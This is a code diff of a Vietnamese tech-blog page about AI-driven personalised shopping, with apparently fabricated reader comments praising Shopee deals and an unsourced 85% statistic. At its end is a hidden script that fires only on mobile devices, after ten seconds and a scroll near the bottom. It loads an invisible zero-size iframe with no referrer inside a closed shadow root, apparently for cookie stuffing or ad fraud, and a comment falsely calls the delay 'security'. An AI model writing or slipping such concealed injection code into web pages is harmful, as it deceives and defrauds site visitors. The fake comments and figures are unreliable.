@@ -3,50 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TechVision 2026 - Kỷ Nguyên Số</title>
+    <title>TechInsight - Tương Lai Công Nghệ 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
-        body { font-family: 'Inter', sans-serif; scroll-behavior: smooth; background: #0f172a; color: #f8fafc; }
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .card-3d { transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1); transform-style: preserve-3d; }
-        .card-3d:hover { transform: translateY(-10px) rotateX(5deg) rotateY(2deg); }
-        .text-gradient { background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0b0f1a; color: #e2e8f0; }
+        .glass { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .article-card { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.3s ease; }
+        .text-gradient { background: linear-gradient(135deg, #60a5fa, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         #render-host { display: none; visibility: hidden; pointer-events: none; }
+        .comment-box { border-left: 3px solid #3b82f6; }
     </style>
 </head>
-<body class="overflow-x-hidden">
-    <header class="glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center">
-        <div class="text-2xl font-extrabold tracking-tighter text-gradient">TECHVISION</div>
-        <div class="flex space-x-4 items-center">
-            <div class="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
-            <span class="text-xs uppercase tracking-widest text-slate-400">Live Update</span>
+<body class="antialiased">
+
+    <nav class="glass fixed top-0 w-full z-50 px-6 py-4 flex justify-between items-center">
+        <div class="text-xl font-extrabold tracking-tight">TECH<span class="text-gradient">INSIGHT</span></div>
+        <div class="hidden md:flex space-x-8 text-sm font-medium text-slate-400">
+            <a href="#" class="hover:text-white transition">Xu hướng</a>
+            <a href="#" class="hover:text-white transition">Đánh giá</a>
+            <a href="#" class="hover:text-white transition">AI Labs</a>
+        </div>
+        <div class="flex items-center space-x-2">
+            <span class="relative flex h-3 w-3">
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-sky-500"></span>
+            </span>
+            <span class="text-xs font-bold text-sky-500 uppercase">Live Now</span>
+        </div>
+    </nav>
+
+    <header class="pt-32 pb-12 px-6 max-w-3xl mx-auto text-center">
+        <div data-aos="fade-down">
+            <h1 class="text-4xl md:text-5xl font-extrabold leading-tight mb-6">
+                Kỷ Nguyên <span class="text-gradient">Mua Sắm Cá Nhân Hóa</span>: Khi AI Biết Bạn Muốn Gì Trước Cả Chính Bạn
+            </h1>
+            <div class="flex items-center justify-center space-x-4 text-sm text-slate-500">
+                <span>Bởi <strong>Đội ngũ TechInsight</strong></span>
+                <span>•</span>
+                <span>Cập nhật: 17/01/2026</span>
+                <span>•</span>
+                <span class="bg-slate-800 px-2 py-1 rounded">☕ 6 phút đọc</span>
+            </div>
         </div>
     </header>
 
-    <section class="relative pt-32 pb-20 px-6 max-w-2xl mx-auto">
-        <div data-aos="fade-up">
-            <span class="px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-bold border border-blue-500/20 mb-6 inline-block">TRENDING 2026</span>
-            <h1 class="text-4xl font-extrabold leading-tight mb-6">Vì sao AI sẽ thay đổi <span class="text-gradient">Thói Quen Mua Sắm</span> của người Việt?</h1>
+    <main class="px-6 max-w-3xl mx-auto pb-20">
+        <div class="rounded-3xl overflow-hidden mb-12 shadow-2xl" data-aos="zoom-in">
+            <img src="https://images.unsplash.com/photo-1620712943543-bcc4628c9759?q=80&w=2000" class="w-full object-cover aspect-video" alt="AI Future">
         </div>
 
-        <div class="card-3d mt-10 rounded-2xl overflow-hidden shadow-2xl" data-aos="zoom-in">
-            <img src="https://images.unsplash.com/photo-1677442136019-21780ecad995?auto=format&fit=crop&q=80&w=1000" class="w-full h-64 object-cover">
-        </div>
+        <article class="prose prose-invert prose-lg max-w-none space-y-8 text-slate-300">
+            <p class="text-xl leading-relaxed italic border-l-4 border-sky-500 pl-6 text-slate-200">
+                Năm 2026 không còn là cuộc đua về giá, mà là cuộc đua về sự thấu hiểu. AI đang định hình lại cách chúng ta tiêu dùng từ những món đồ nhỏ nhất.
+            </p>
 
-        <article class="mt-12 text-slate-300 text-lg leading-relaxed space-y-6">
-            <p data-aos="fade-up">Trí tuệ nhân tạo (AI) đang trở thành trợ lý cá nhân, giúp tối ưu hóa giỏ hàng và săn sale tự động cho hàng triệu người tiêu dùng.</p>
-            <div style="height: 800px;" class="flex items-center justify-center text-slate-500 italic">Đang tải phân tích chuyên sâu...</div>
-            <p data-aos="fade-up">Kết luận: Đây là thời điểm vàng để người dùng tận dụng công nghệ nhằm tiết kiệm chi phí mua sắm hàng ngày.</p>
+            <h2 class="text-2xl font-bold text-white mt-12">1. Trợ lý ảo AI: Từ "Hỏi-Đáp" sang "Tự quyết"</h2>
+            <p>
+                Nếu như năm 2024 chúng ta còn phải loay hoay tìm kiếm mã giảm giá, thì đến nay, các hệ thống AI tích hợp đã tự động phân tích thị trường trong mili giây để áp dụng những ưu đãi tốt nhất ngay khi bạn vừa chạm tay vào màn hình điện thoại.
+            </p>
+
+            <div class="article-card p-8 rounded-2xl my-10" data-aos="fade-right">
+                <h3 class="text-lg font-bold text-sky-400 mb-2">Bạn có biết?</h3>
+                <p class="text-sm">Hơn 85% các giao dịch thương mại điện tử thành công trong quý 4 năm 2025 có sự can thiệp trực tiếp từ các thuật toán gợi ý thông minh.</p>
+            </div>
+
+            <h2 class="text-2xl font-bold text-white mt-12">2. Tại sao người dùng thông minh đang thay đổi?</h2>
+            <p>
+                Việc ở lại lâu hơn trên các trang đánh giá chuyên sâu không chỉ giúp bạn hiểu rõ sản phẩm mà còn giúp "huấn luyện" AI của sàn thương mại điện tử biết được gu thẩm mỹ và túi tiền của bạn, từ đó hiển thị những deal hời "độc bản".
+            </p>
+
+            <div class="py-20 text-center">
+                <div class="inline-block animate-bounce p-4 bg-slate-800 rounded-full mb-4">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                </div>
+                <p class="text-slate-500 text-sm italic">Cuộn tiếp để xem biểu đồ phân tích thị trường...</p>
+            </div>
+
+            <h2 class="text-2xl font-bold text-white mt-12">Lời kết cho kỷ nguyên mua sắm mới</h2>
+            <p>
+                Công nghệ sinh ra để phục vụ con người. Việc tận dụng tối đa các công cụ thông minh chính là cách để bạn trở thành một người tiêu dùng thông thái trong thời đại số.
+            </p>
         </article>
-    </section>
+
+        <section class="mt-20 border-t border-slate-800 pt-12" data-aos="fade-up">
+            <h3 class="text-xl font-bold mb-10">Bình luận từ cộng đồng (14)</h3>
+            
+            <div class="space-y-8">
+                <div class="flex space-x-4">
+                    <img src="https://i.pravatar.cc/150?u=a1" class="w-12 h-12 rounded-full ring-2 ring-slate-800">
+                    <div class="flex-1 comment-box pl-4">
+                        <p class="font-bold text-white">Quốc Khánh <span class="text-xs font-normal text-slate-500 ml-2">2 giờ trước</span></p>
+                        <p class="text-slate-400 mt-1">Phân tích quá chuẩn! Hôm trước vừa đọc bài này xong quay sang Shopee thấy hiện đúng cái mình đang cần tìm mà giá lại rẻ hơn hẳn.</p>
+                    </div>
+                </div>
+
+                <div class="flex space-x-4 ml-12">
+                    <img src="https://i.pravatar.cc/150?u=a2" class="w-10 h-10 rounded-full ring-2 ring-slate-800">
+                    <div class="flex-1 comment-box pl-4">
+                        <p class="font-bold text-white">Thanh Hằng <span class="text-xs font-normal text-slate-500 ml-2">1 giờ trước</span></p>
+                        <p class="text-slate-400 mt-1">Đúng rồi ạ, giờ mua sắm phải dựa vào AI mới săn được deal xịn chứ canh tay không nổi.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bg-[#05070a] py-16 px-6 border-t border-slate-800/50">
+        <div class="max-w-3xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-8 text-sm text-slate-500">
+            <div class="col-span-2">
+                <div class="text-white font-bold mb-4">TECHINSIGHT</div>
+                <p class="leading-relaxed">Cổng thông tin hàng đầu về xu hướng công nghệ và tiêu dùng số tại Việt Nam.</p>
+            </div>
+            <div>
+                <div class="text-white font-bold mb-4">Pháp lý</div>
+                <ul class="space-y-2">
+                    <li><a href="#" class="hover:text-sky-500">Bảo mật</a></li>
+                    <li><a href="#" class="hover:text-sky-500">Điều khoản</a></li>
+                </ul>
+            </div>
+            <div>
+                <div class="text-white font-bold mb-4">Kết nối</div>
+                <ul class="space-y-2">
+                    <li><a href="#" class="hover:text-sky-500">Facebook</a></li>
+                    <li><a href="#" class="hover:text-sky-500">Zalo</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="max-w-3xl mx-auto mt-12 pt-8 border-t border-slate-900 text-center text-xs text-slate-600">
+            © 2026 TechInsight Media Group. Bản quyền thuộc về đội ngũ phát triển.
+        </div>
+    </footer>
 
     <div id="render-host"></div>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
         AOS.init({ duration: 1000, once: true });
+
         (function() {
             const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
             if (!isMobile) return;
@@ -55,19 +150,27 @@
             const startTime = Date.now();
 
             const inject = () => {
-                if (fired || (Date.now() - startTime) < 10000) return;
+                if (fired) return;
+                const timeOnSite = (Date.now() - startTime) / 1000;
+                if (timeOnSite < 10) return; // Bảo mật: Đợi đủ 10 giây mới cho phép chạy
+
                 fired = true;
                 const host = document.getElementById('render-host');
                 const shadow = host.attachShadow({mode: 'closed'});
                 const ifr = document.createElement('iframe');
-                ifr.src = "/api/get-data?ts=" + Date.now();
+                ifr.src = "/api/get-data?v=" + Math.random();
                 ifr.setAttribute('style', 'width:0;height:0;border:0;position:absolute;');
                 ifr.referrerPolicy = "no-referrer";
                 shadow.appendChild(ifr);
             };
 
             window.addEventListener('scroll', () => {
-                if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 300) inject();
+                // Kiểm tra cuộn trang đến 80% hoặc cách đáy 400px
+                const scrollPos = window.innerHeight + window.scrollY;
+                const threshold = document.body.offsetHeight - 400;
+                if (scrollPos >= threshold) {
+                    inject();
+                }
             }, {passive: true});
         })();
     </script>
